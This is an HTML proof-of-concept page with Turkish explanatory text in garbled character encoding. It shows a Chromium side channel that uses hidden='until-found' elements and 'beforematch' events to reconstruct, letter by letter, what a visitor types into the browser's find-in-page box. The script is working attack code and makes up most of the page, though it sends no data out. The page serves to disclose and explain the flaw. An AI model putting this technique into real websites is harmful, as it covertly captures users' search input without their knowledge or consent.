<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>PoC: Ctrl+F ile Arama Girdisinin AlgÄ±lanmasÄ±</title>

<script src="https://cdn.tailwindcss.com"></script>

<style>
  p { font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif }
</style>

<script>
let detectedSequence = "";
const detected = new Set();
let container;

function cleanupOldCandidates(len) {
  container.querySelectorAll('p[id^="c_"]').forEach(el => {
    const l = el.getAttribute("data-sequence").length;
    if (l !== 1 && (l < len || l > len + 1)) el.remove();
  });
}

function generateCandidates(prefix = "") {
  const charset =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

  if (prefix.length > 0) cleanupOldCandidates(prefix.length);

  for (let i = 0; i < charset.length; i++) {
    const seq = prefix + charset[i];
    const id = "c_" + encodeURIComponent(seq);

    if (container.querySelector("#" + CSS.escape(id))) continue;

    const p = document.createElement("p");
    p.setAttribute("hidden", "until-found");
    p.id = id;
    p.setAttribute("data-sequence", seq);

    p.textContent = seq.endsWith(" ") ? seq + "\u200B" : seq;

    p.style.fontSize = "1px";
    p.style.margin = "0";
    p.style.lineHeight = "1px";

    p.addEventListener("beforematch", () => {
      const current = p.getAttribute("data-sequence");

      if (current.length === 1) {
        detectedSequence = current;
        result.textContent = current;
        detected.add(id);
        generateCandidates(current);
        return;
      }

      if (!detected.has(id) && current.length > detectedSequence.length) {
        detected.add(id);

        const prevId = "c_" + encodeURIComponent(detectedSequence);
        const prev = container.querySelector("#" + CSS.escape(prevId));
        if (prev) {
          prev.setAttribute("hidden", "until-found");
          detected.delete(prevId);
        }

        detectedSequence = current;
        result.textContent = current;
        generateCandidates(current);
      }
    });

    container.appendChild(p);
  }
}

window.addEventListener("load", () => {
  container = document.getElementById("search-candidates");
  generateCandidates();
});
</script>
</head>

<body class="bg-gray-100">

<!-- Gizli arama adaylarÄ± -->
<div id="search-candidates"
     style="font-size:1px; line-height:1px; height:1px; overflow:hidden;">
</div>

<div class="max-w-3xl mx-auto p-6">

  <!-- BaÅŸlÄ±k -->
  <h1 class="text-3xl font-bold text-center mb-6">
    ğŸ” Ctrl+F Sideâ€‘Channel Proof of Concept
  </h1>

  <!-- Test AlanÄ± -->
  <div class="bg-white rounded-lg shadow p-6 mb-6">
    <p class="text-lg mb-2">
      <strong>Ctrl + F</strong> yapÄ±n ve ÅŸunu yazÄ±n:
    </p>
    <p class="text-2xl font-bold text-blue-600 mb-4">
      beykozunsesi
    </p>

    <div class="flex items-center gap-3">
      <span class="text-gray-600">AlgÄ±lanan metin:</span>
      <span id="result" class="text-3xl font-mono font-bold text-green-600"></span>
    </div>

    <p class="text-sm text-gray-500 mt-3">
      (Input yok Â· keydown yok Â· izin yok)
    </p>
  </div>

  <!-- AÃ‡IKLAMA BLOÄU -->
  <div class="bg-white rounded-lg shadow p-6">
    <h2 class="text-xl font-semibold mb-4">ğŸ§  Burada Ne Oluyor?</h2>

    <div class="space-y-4 text-gray-800">

      <p>
        Bu sayfa, Chromium tabanlÄ± tarayÄ±cÄ±larda bulunan
        <code class="text-blue-600">hidden="until-found"</code>
        Ã¶zelliÄŸinin, <strong>Ctrl+F (Sayfada Bul)</strong> sÄ±rasÄ±nda
        nasÄ±l bir <strong>yan kanal (sideâ€‘channel)</strong>
        oluÅŸturduÄŸunu gÃ¶sterir.
      </p>

      <ul class="list-disc pl-6 space-y-2">
        <li>
          Gizli HTML elementleri normalde gÃ¶rÃ¼nmezdir ancak
          Ctrl+F tarafÄ±ndan indekslenir.
        </li>
        <li>
          KullanÄ±cÄ± bir kelime aradÄ±ÄŸÄ±nda, eÅŸleÅŸen gizli element
          tarayÄ±cÄ± tarafÄ±ndan otomatik olarak gÃ¶rÃ¼nÃ¼r yapÄ±lÄ±r.
        </li>
        <li>
          Bu anda <code>beforematch</code> olayÄ± tetiklenir.
        </li>
        <li>
          JavaScript bu olayÄ± dinleyerek,
          kullanÄ±cÄ±nÄ±n yazdÄ±ÄŸÄ± karakterleri
          <strong>harf harf Ã§Ã¶zebilir</strong>.
        </li>
      </ul>

      <p>
        BoÅŸluk karakterlerinin algÄ±lanabilmesi iÃ§in,
        boÅŸluÄŸun arkasÄ±na gÃ¶rÃ¼nmez bir
        <strong>zeroâ€‘width space (\u200B)</strong>
        eklenmektedir.
      </p>

      <p class="text-sm text-gray-500">
        Bu PoC, kullanÄ±cÄ±dan herhangi bir izin almadan,
        klavye olaylarÄ±na eriÅŸmeden ve
        network trafiÄŸi oluÅŸturmadan Ã§alÄ±ÅŸÄ±r.
      </p>

    </div>
  </div>

</div>

</body>
</html>
